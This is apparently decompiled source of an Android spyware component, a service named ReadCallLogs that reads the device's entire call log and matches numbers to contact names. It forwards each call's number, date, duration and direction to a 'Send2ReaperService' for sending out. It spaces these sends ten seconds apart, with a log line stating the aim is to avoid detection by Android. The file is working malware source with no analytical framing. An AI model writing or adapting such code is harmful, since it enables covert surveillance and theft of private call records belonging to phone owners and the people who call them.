package com.bigeye.crasher;

import android.app.IntentService;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;
import java.text.DateFormat;
import java.util.Calendar;
/* loaded from: classes.dex */
public class ReadCallLogs extends IntentService {
    private static final long SLEEP_TIME = 10000;
    private final String APP_TAG = "ReadCallLogs";
    final String prefName = "Sync";
    SharedPreferences sharedPrefs;

    public ReadCallLogs() {
        super("Read_All_Call_Logs");
    }

    @Override // android.app.IntentService
    protected void onHandleIntent(Intent intent) {
        this.sharedPrefs = getSharedPreferences("Sync", 0);
        boolean callLogsSynced = this.sharedPrefs.getBoolean("CallLogsSynced", false);
        String lastSyncDate = this.sharedPrefs.getString("LastCallLogsSyncDate", "NULL");
        if (callLogsSynced) {
            Log.i("ReadCallLogs", "Call Logs had been synced. Date: " + lastSyncDate);
            Log.i("ReadCallLogs", "commiting suicide");
            stopSelf();
        } else {
            Log.i("ReadCallLogs", "Call Logs have NEVER been synced. Date: " + lastSyncDate);
            Log.i("ReadCallLogs", "About to start fetching all Call logs: standby ");
            GetCallLogs();
        }
        this.sharedPrefs = getSharedPreferences("Sync", 0);
        SharedPreferences.Editor editor = this.sharedPrefs.edit();
        editor.putBoolean("CallLogsSynced", true);
        editor.putString("LastCallLogsSyncDate", DateFormat.getDateTimeInstance().format(Calendar.getInstance().getTime()));
        editor.commit();
        Log.i("ReadCallLogs", "finished reading all call logs: commiting suicide");
        stopSelf();
    }

    private void GetCallLogs() {
        Cursor cursor = null;
        try {
            cursor = getContentResolver().query(Uri.parse("content://call_log/calls"), null, null, null, "date DESC");
            if (cursor.getCount() <= 0) {
                Log.i("ReadCallLogs", "Call logs empty!");
                return;
            }
            Log.i("ReadCallLogs", "found " + cursor.getCount() + " records");
            while (cursor.moveToNext()) {
                String callLogID = cursor.getString(cursor.getColumnIndex("_id"));
                String phoneNo = cursor.getString(cursor.getColumnIndex("number"));
                long CDate = cursor.getLong(cursor.getColumnIndex("date"));
                new android.text.format.DateFormat();
                String callDate = android.text.format.DateFormat.format("dd-MMM-yyyy k:m:s", CDate).toString();
                String duration = cursor.getString(cursor.getColumnIndex("duration"));
                String callType = cursor.getString(cursor.getColumnIndex("type"));
                String isCallNew = cursor.getString(cursor.getColumnIndex("new"));
                if (Integer.parseInt(callType) != 3 || Integer.parseInt(isCallNew) > 0) {
                }
                String name = new ReadContacts(getApplicationContext()).getContactName(phoneNo);
                if (name == "") {
                    name = "unknown";
                }
                String callLog = "";
                if (callType.equalsIgnoreCase(String.valueOf(1))) {
                    callLog = "Incoming call from: <" + name + ">" + phoneNo;
                } else if (callType.equalsIgnoreCase(String.valueOf(2))) {
                    callLog = "Outgoing call to: <" + name + ">" + phoneNo;
                } else if (callType.equalsIgnoreCase(String.valueOf(3))) {
                    callLog = "Missed call from: <" + name + ">" + phoneNo;
                }
                String callLog2 = callLog + " on " + callDate + " duration: " + duration + " secs.";
                String logStr = "CallLogID:" + callLogID + ":PhoneNo: " + phoneNo + ":CallDate:" + callDate + ":CallType: " + callType + " | isCallNew:" + isCallNew + " | CallDuration: " + duration + " secs.";
                Log.i("ReadCallLogs", logStr);
                Log.i("ReadCallLogs", callLog2);
                Log.i("ReadCallLogs", "about to start sending logs in 10 secs bursts - so as to avoid detection by android system!");
                try {
                    new Thread();
                    Thread.sleep(SLEEP_TIME);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                Intent repo = new Intent(this, Send2ReaperService.class);
                repo.putExtra("OPERATION", "OUTGOING");
                repo.putExtra("MSG", callLog2);
                startService(repo);
            }
        } catch (Exception ex) {
            Log.i("ReadCallLogs", "Exception: " + ex.toString());
        } finally {
            cursor.close();
        }
    }
}
